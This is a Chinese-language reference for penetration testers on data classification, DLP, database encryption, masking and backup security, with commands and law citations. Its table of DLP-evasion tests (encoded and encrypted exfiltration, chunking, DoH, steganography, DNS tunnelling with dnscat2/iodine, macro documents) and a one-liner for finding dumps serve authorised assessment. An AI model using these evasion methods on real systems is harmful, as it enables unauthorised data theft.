# 数据安全与 DLP 实操参考（渗透/众测交付视角）

来源：上游 `HiFullHouse/CyberSecurity-Skills` 的 22-数据安全与隐私(6 卡)、14-安全审计(等保/配置/网络合规)抽取重写，并按"现场可执行"重排。
标注约定：**【未验证】**=本机未实测，命令/参数按文档写但用前先小样本试；**【需核对】**=标准或产品版本相关，引用前查现行文本。

## 1. 数据分类分级（能落地的最小体系）

- 国标三档（GB/T 43697-2024《数据安全技术 数据分类分级规则》，2024-03-15 发布 / 2024-10-01 实施）：**核心数据 > 重要数据 > 一般数据**；一般数据在附录 H 给出细化分级（可选 4 级 / 3 级 / 2 级框架，级别越大越敏感）。
- 附录 H.4「最低参考级别」（4 级框架下，客户选 3 级框架时档位整体下调，**需核对**）：敏感个人信息 ≥4 级；一般个人信息 ≥2 级；内部员工个人信息 ≥2 级；去标识化个人信息 ≥2 级；个人标签信息 ≥2 级；有条件开放/共享的公共数据 ≥2 级；禁止开放/共享的公共数据 ≥4 级。
- 附录 I 按加工程度分：原始数据 / 脱敏数据 / 标签数据 / 统计数据 / 融合数据——客户说"导出的都是脱敏数据"时，先确认是可重标识的**去标识化**还是不可逆**匿名化**（去标识化仍属个人信息，个保法语境下仍需保护）。
- 个人信息类别与典型示例可直接引用 GB/T 35273-2020（个人信息安全规范）的类别表。
- 法律锚点（**引用条款前核对现行文本**）：《数据安全法》第二十一条（分类分级保护制度 + 重要数据目录）；《网络安全法》2025 年修订、2026-01-01 施行版中"留存网络日志不少于六个月"位于**第二十三条第（三）项**（修订前为第二十一条，老资料普遍写作第二十一条）；《网络数据安全管理条例》第二十九条给出重要数据定义与目录要求。

**分级落地检查表（现场动作 + 缺陷写法）**

| # | 检查项 | 现场动作 | 缺陷表述 |
|:-:|:--|:--|:--|
| 1 | 分级清单 | 索取数据资产清单/分类分级表 | 无分级清单 → 最小权限无从证明 |
| 2 | 标签落位 | `COMMENT ON COLUMN`、S3 object tagging、Purview 标签 | 高敏列无标识，脱敏范围随人走 |
| 3 | 高敏列加密/掩码 | 直连库 `SELECT` 看是否明文 | PII/卡号明文落库 |
| 4 | 导出物 | 找 `*.sql/*.csv/*.xlsx/*.bak` dump | 生产明文导出物在共享目录 |
| 5 | 备份加密 | 见 §6 | 备份明文 + 同口令 |
| 6 | 账号分权 | 业务账号能读全表？ | 数据库单账号通吃，无列级/行级隔离 |
| 7 | 留存与删除 | 有无过期清理任务与执行证据 | 保存期限无执行证据（个保法第 19 条最短必要） |

## 2. DLP 三形态（网络 / 终端 / 存储）

### 2.1 网络 DLP
```bash
zeek -C -r capture.pcap                 # 生成 conn/dns/http 日志
zeek-cut uri host < http.log | grep -iE 'upload|export'   # 批量外传面
cat > /usr/share/zeek/site/dlp.zeek <<'EOF'
module DLP;
event http_entity_data(c: connection, is_orig: bool, length: count, data: string) {
    if ( /1[3-9][0-9]{9}/ in data )            # 明文手机号走 HTTP
        print fmt("PII over HTTP: %s -> %s", c$id$orig_h, c$http$host);
}
EOF
```
- **TLS 之后内容不可见**：这是网络 DLP 的第一大局限。要验证只能落 keylog 再解：
  `export SSLKEYLOGFILE=$TMPDIR/keys.log`（curl/Firefox/Chrome 均支持）→ `tshark -o tls.keylog_file:$TMPDIR/keys.log -r cap.pcap -Y http2`
- DNS 侧信道：`tshark -r cap.pcap -Y "dns.txt_len > 60" -T fields -e dns.qry.name`（**【未验证】** 字段名随 Wireshark 版本，可退化为统计 qname 长度/熵）。
- 明文协议指纹/协议识别：`ndpiReader -i eth0 -w out.txt`（**【未验证】** 参数按 nDPI 版本调整）。
- 云侧：AWS Macie 只覆盖 S3，且对压缩包/加密文件/超大文件检出受限（**【需核对】** 支持类型清单）：
```bash
aws macie2 create-classification-job --job-type ONE_TIME --name pii-scan \
  --s3-job-definition '{"bucketDefinitions":[{"accountId":"123456789012","buckets":["my-bucket"]}]}'
aws macie2 list-findings --finding-criteria '{"criterion":{"severity":{"gte":7}}}'
```
  上游原文写作 `--s3-job-definition bucketDefinitions=[{bucketId=my-bucket}]` 是**错的**（键名应为 `buckets` 数组，嵌套结构要用 JSON 或 `BucketDefinitions=[{AccountId="…",Buckets=["…"]}]`），本文件已改为实测可用的 JSON 形式。
- GCP DLP（infoType 名称用控制台核对；v2 路径含 `locations`）：
```bash
curl -s -X POST -H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
  -H 'Content-Type: application/json' \
  -d '{"item":{"value":"<PHONE-REDACTED>"},"inspectConfig":{"infoTypes":[{"name":"PHONE_NUMBER"}]}}' \
  "https://dlp.googleapis.com/v2/projects/PROJECT_ID/locations/global/content:inspect"
```

### 2.2 终端 DLP
```powershell
# 可移动存储审计：先开审计子类别，再看事件（6416 = 新外部设备被识别）
auditpol /set /subcategory:"Removable Storage" /success:enable /failure:enable
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=6416} | Select-Object TimeCreated,Message
# 打印审计（307 = 文档已打印）
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PrintService/Admin'; Id=307}
# 剪贴板命中 PII（仅检测思路，勿在生产长期跑）
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText() -match '\b[1-9]\d{5}(19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]\b'
```
**【未验证】** 上述事件/子类别名随 Windows 版本与语言包变化，先在靶机确认。上游的 `$dlpPolicy = @{...}` 哈希表并非真实 cmdlet，正确入口是 Security & Compliance PowerShell：
```powershell
Get-DlpSensitiveInformationType | Select Name,Id      # 先拿到真实 SIT 名称
New-DlpCompliancePolicy -Name "PII-Policy" -ExchangeLocation All -SharePointLocation All -OneDriveLocation All
New-DlpComplianceRule -Name "Block-CCN" -Policy "PII-Policy" `
  -ContentContainsSensitiveInformation @{Name="Credit Card Number"; minCount="1"} -BlockAccess $true -NotifyUser Owner
```
`az purview classification-rule create` 与 `dlpcmd policy -list`：**【未验证，疑似不存在/非公开 CLI】**，Azure 侧请用 Purview 门户或 Security & Compliance PowerShell。

### 2.3 存储面数据发现
```bash
rg -a -n -u --hidden -e '\b(?:[1-9]\d{5}(?:19|20)\d{2}(?:0[1-9]|1[0-2])(?:0[1-9]|[12]\d|3[01])\d{3}[\dXx])\b' \
   -e '1[3-9]\d{9}' -e '\b(?:\d[ -]?){13,16}\b' /mnt/share | head -200   # rg 默认跳过二进制/忽略文件，-a -u 必加
gitleaks detect --source /data --no-git -v            # 密钥/凭据面
trufflehog filesystem /data --only-verified --json
detect-secrets scan --all-files /data > .secrets.baseline
```
上游把 `clamscan` 列为"D LP 扫描"是**误用**——ClamAV 只做恶意代码检测，与内容分类无关。OpenDLP 所在托管（Google Code）早已关闭，**不建议再用**。

### 2.4 DLP 绕过检测点（这是数据面测试的主战场）
DLP 以"内容正则 + 阈值 + 通道"为假设，逐个打掉这些假设：

| 绕过手法 | 验证动作 | 为什么可能漏检 |
|:--|:--|:--|
| 编码外传 | `echo -n <PHONE-REDACTED> \| base64`，body 里塞 base64 块 | 网络/终端 DLP 只匹配明文形态 |
| 压缩+编码 | `gzip -c d.csv \| base64 -w0` | 同上，且熵值变高 |
| 加密压缩 | `7z a -pPASS -mhe=on out.7z d.csv`（`-mhe=on` 连文件名一起加密）；`zip -P PASS` | 内容不可解 → 只能靠行为/大小告警 |
| 分片 | 每片字符数压到阈值以下，多次 POST/multipart | 单次载荷低于 minCount/minConfidence |
| TLS/DoH | 纯 443 外发；`curl --doh-url https://1.1.1.1/dns-query https://x` | 内容与域名双盲 |
| 云盘/对象存储直传 | `curl -X PUT --upload-file f 'https://…presigned…'` | 已授权通道，非"外泄特征" |
| 隐写 | `steghide embed -cf cover.jpg -ef secret.txt -p pass` | 图片载体，DLP 常放行 |
| DNS 隧道 | dnscat2/iodine 外带；对照 `dns.qry.name` 长度分布 | 只看域名黑名单时失守 |
| 邮件/文档伪装 | HTML/SVG 附件、图片马、`.docm` 宏 | 按扩展名放行策略 |
| 剪贴板/截屏/打印 | 复制→外部 IM 粘贴；截屏 OCR | 终端 DLP 覆盖不全或仅审计不阻断 |

检测侧最小可用实现（上游原样，可用）：base64 块高熵 + 不可打印字符判定——
```python
import re, base64
pat = r'(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
for m in re.findall(pat, body):
    try:
        d = base64.b64decode(m, validate=True)
        if any(not c.isprintable() for c in d): print("suspicious encoded blob", m[:48])
    except Exception: pass
```
隐写研究工具 `java -jar StegExpose.jar stego_images/`（**【未验证】** 需自备 jar）。

## 3. 数据库加密

- **SQL Server TDE**（真实命令，注意 `CREATE DATABASE ENCRYPTION KEY` 是"服务器级 DEK"）：
```sql
CREATE MASTER KEY ENCRYPTION BY PASSWORD = '<REDACTED>';
CREATE CERTIFICATE TdeCert WITH SUBJECT = 'TDE Cert';
CREATE DATABASE ENCRYPTION KEY WITH ALGORITHM = AES_256 ENCRYPTION BY SERVER CERTIFICATE TdeCert;
ALTER DATABASE MyDB SET ENCRYPTION ON;
SELECT DB_NAME(database_id) AS db, encryption_state, encryption_state_desc, percent_complete
FROM sys.dm_database_encryption_keys;
-- 备份也要带加密，否则备份文件是明文的
BACKUP DATABASE MyDB TO DISK='D:\bak\MyDB.bak' WITH ENCRYPTION (ALGORITHM=AES_256, SERVER CERTIFICATE=TdeCert);
```
- **pgcrypto 列级加密**（真实函数；上游的 `SELECT gen_keypair('RSA',2048)` **不存在**，pgcrypto 不生成密钥，必须外部用 gpg 生成后导入）：
```sql
CREATE EXTENSION IF NOT EXISTS pgcrypto;
-- 对称
INSERT INTO t(secret) VALUES (pgp_sym_encrypt('<PHONE-REDACTED>','passphrase'));
SELECT pgp_sym_decrypt(secret, 'passphrase') FROM t;
-- 非对称：公钥加密、私钥解密（密钥文件须能访问到，别放 Web 目录）
INSERT INTO t(secret) VALUES (pgp_pub_encrypt('<PHONE-REDACTED>', dearmor(pg_read_binary_file('/keys/pub.asc')::text)));
SELECT pgp_pub_decrypt(secret, dearmor(pg_read_binary_file('/keys/priv.asc')::text), 'keypass') FROM t;
```
- **渗透要点（比加密本身更常翻车）**：①加密列不能索引/范围查询，业务往往改成"另存明文影子列"→ 直接读影子列；②密钥写在 `application.yml/.env/备份脚本`里，拿到源码即拿到密钥；③TDE/文件级加密对 DBA 完全透明，`SELECT` 仍是明文——"已加密"不等于"PII 不可见"；④MySQL/MariaDB 表空间加密依赖 keyring 插件，社区版/企业版与版本差异较大，**【需核对】** 后再对客户下结论（`SELECT * FROM information_schema.INNODB_TABLESPACES WHERE ENCRYPTION='Y'`）。
- 传输侧必查：`psql -c "SHOW ssl;"`、`SHOW VARIABLES LIKE 'require_secure_transport';`、连接串里是否 `sslmode=require`。

## 4. 脱敏：静态 / 动态 / 匿名化

- **静态（SDM，改数据，不可逆）**——上游写法可用但要有事务与备份：
```sql
UPDATE users SET phone = CONCAT(LEFT(phone,3),'****',RIGHT(phone,4));       -- PG
UPDATE users SET email = CONCAT(LEFT(email,2),'***@',SPLIT_PART(email,'@',2));
-- MySQL: INSERT(t.phone,4,4,'****')
```
  真实陷阱：唯一约束冲突、外键/统计口径被打乱、脱敏后仍可与其他列联合重标识、`UPDATE` 前必须备份（`CREATE TABLE x_bak AS SELECT * FROM x`）。
- **动态（DDM，只影响查询结果）**：
```sql
-- SQL Server：掩码 + 解掩码权限（UNMASK 只对已有权限者生效）
ALTER TABLE users ALTER COLUMN phone ADD MASKED WITH (FUNCTION='partial(1,"****",3)');
GRANT UNMASK TO reporting_user;
-- Oracle
BEGIN DBMS_REDACT.ADD_POLICY(object_schema=>'APP', object_name=>'USERS', policy_name=>'phone_mask',
  column_name=>'PHONE', function_type=>DBMS_REDACT.PARTIAL, function_parameters=>'1,4,****,3'); END;
```
  交付必测的**侧信道**：掩码不改变比较/排序/聚合——`WHERE phone='<PHONE-REDACTED>'` 仍命中、`ORDER BY phone` 能排序、`COUNT(DISTINCT)` 仍是真值；DDM 也不保护备份、`SELECT INTO`、`bcp`/BULK 导出。上游的 `pg_ddm` + `CREATE MASKING POLICY … FOR COLUMN` **【未验证，疑似不存在】**，PostgreSQL 请用 Anonymizer。
- **PostgreSQL Anonymizer（真实语法，已核对官方文档）**：
```sql
CREATE EXTENSION IF NOT EXISTS anon CASCADE;  SELECT anon.init();
SECURITY LABEL FOR anon ON COLUMN people.phone  IS 'MASKED WITH FUNCTION anon.partial(phone,2,$$******$$,2)';
SECURITY LABEL FOR anon ON COLUMN people.name   IS 'MASKED WITH FUNCTION anon.fake_last_name()';
SECURITY LABEL FOR anon ON COLUMN people.birth  IS 'MASKED WITH FUNCTION anon.random_date_between(''1920-01-01''::DATE,now())';
SELECT anon.anonymize_database();                     -- 静态：破坏性，先备份
SELECT anon.anonymize_table('public.users');          -- 静态单表
SELECT anon.start_dynamic_masking();                  -- 动态：按角色暴露不同数据
CREATE ROLE skynet LOGIN; SECURITY LABEL FOR anon ON ROLE skynet IS 'MASKED';
SELECT anon.k_anonymity('public.users','{city,zip}'); -- 直接测 k 值，不用自己写脚本
```
  规则里的字符串必须用 `$$…$$` 美元引用（外层已是单引号）；**[CVE-2026-9617]**（经 OpenCVE 核实）`anon.k_anonymity()` 存在恶意列名 SQLi，**3.1.0** 修复；客户环境低于该版本时，应急处置为 `DROP FUNCTION anon.k_anonymity();`。
- **k-匿名 / 差分隐私真实要点**（上游 Python 示例是"简化演示"，不是 ARX 实现，勿对外称 ARX）：
  - 步骤：选准标识符(QI) → 泛化/抑制 → 检查每个等价类 ≥ k。k 值只是下限；**同质攻击**下等价类内敏感值全相同，k 再大也泄露，需 l-多样性 / t-接近性；高维稀疏数据做 k-匿名几乎必然导致可用性归零——客户场景高维时应直接建议 DP 或聚合发布，而不是硬做 k-匿名。
  - 差分隐私：Laplace 机制噪声尺度 b=Δ/ε；**串行组合 ε 相加**，高级组合 ε√(2k·ln(1/δ)) + kε(e^ε−1)；ε 是总预算，反复发布统计量会把预算耗光——这是落地最常翻车的点。真实实现用库（OpenDP / Google differential-privacy / IBM diffprivlib），别手写噪声。
- **脱敏有效性验证路径（我们的交付物）**：同一条 PII 沿 5 条路走一遍——①非特权账号直查 ②业务 API/报表 ③导出(SDM 是否覆盖) ④备份/从库 ⑤日志与错误堆栈；任一路径回明文即判"脱敏无效"。再补两刀：掩码列做排序/计数差分推断；跨表 JOIN 用非掩码列还原掩码列。

## 5. 备份加密与恢复演练

```bash
gpg --full-generate-key                                   # 生成收件人密钥（离线保管私钥）
mysqldump --single-transaction --routines --triggers --all-databases | gpg -e -r dba@corp > all.sql.gpg
pg_dump -Fc mydb | gpg -e -r dba@corp > mydb.dump.gpg
openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -in dump.sql -out dump.sql.enc -pass file:/etc/backup.key
gpg --list-packets all.sql.gpg                            # 确认确实是加密包
```
- 口令永远不要写在命令行（`-pass pass:` 会进 history/ps），用 `-pass file:` 或 `--passphrase-fd`。
- 恢复演练四要素：RTO/RPO 实测计时、解密口令托管与交接、**恢复出来的数据是否仍是脱敏数据**（生产备份恢复到测试环境是最常见的合规事故）、恢复环境网络隔离与演练留痕。
- 渗透侧高命中点：明文 dump 落 `/tmp`、`.bak` 放 Web 目录、备份服务器同口令、S3/OSS bucket 公开、备份脚本内嵌凭据。抓取命令：`find / -xdev \( -name '*.sql' -o -name '*.dump' -o -name '*.bak' -o -name '*.zip' \) -size +1M 2>/dev/null`。

## Pitfalls

- 别把"加密了"当成"合规了"：TDE 对 DBA 透明、密钥与数据同机时加密只防物理介质丢失。
- 别把"脱敏"当成"匿名化"：去标识化数据仍是个人信息（可重标识），个保法/GB/T 43697 语境下按个人信息管。
- 网络 DLP 看不了 TLS；终端 DLP 覆盖不全；存储 DLP 依赖分类标签——三者都是"假设"，测试就该逐个证伪。
- 上游命令里的语法错误已在本文件就地标注（Macie 定义、`gen_keypair`、`pg_ddm`、AIP/DLP 哈希表配置），照抄上游前先跑小样本。
- 法条与标准条款号会随修订变动（网络安全法 2025 修订即为一例），交付物里引用编号时一并写标准全名与版本。
